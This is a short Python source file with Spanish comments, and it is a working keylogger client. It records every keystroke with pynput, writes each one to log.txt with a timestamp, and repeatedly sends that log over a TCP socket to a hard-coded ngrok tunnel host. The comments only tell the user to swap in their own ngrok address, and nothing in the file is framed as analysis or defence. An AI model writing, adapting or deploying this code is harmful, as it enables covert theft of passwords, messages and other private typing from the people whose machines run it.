import socket
from pynput.keyboard import Listener
import time

# Cliente Socket del lado.
s = socket.socket()

# Cambiar la dirección del host y el puerto para que coincida con la dirección de Ngrok
host = '0d6e-201-123-90-187.ngrok-free.app'
port = 7272
connecting = True

# Conexión al servidor TCP con manejo de errores
while connecting:
    try:
        print('Intentando conectar...')
        s.connect((host, port))
        connecting = False
    except:
        continue

print('Conexión exitosa')

# Crear el archivo de registro inicial si no existe.
logfile = open('log.txt', 'a+')
logfile.close()

# Función de registro para comenzar a registrar
def logging():
    global bt, logfile
    bt = time.time()
    logfile = open('log.txt', 'w+')

    # Función para registrar pulsaciones de teclas
    def on_press(key):
        # Registrar tecla + datos y hora de clic.
        log_info = f'{key} Presionada en {time.asctime()}'
        print(log_info)
        logfile.write(log_info + '\n')
        # La siguiente línea cierra el archivo después de 30 segundos de inactividad.
        if bt + 30 < time.time():
            print('Cerrando archivo...')
            logfile.close()
            return False

    # Iniciar el listener de pynput
    with Listener(on_press=on_press) as listener:
        listener.join()

# Llamar a la función de registro y enviar el contenido de log.txt en binario al servidor TCP.
while True:
    logging()
    with open('log.txt', 'rb') as data:
        data_sent = data.read(16777216)
        s.send(data_sent)
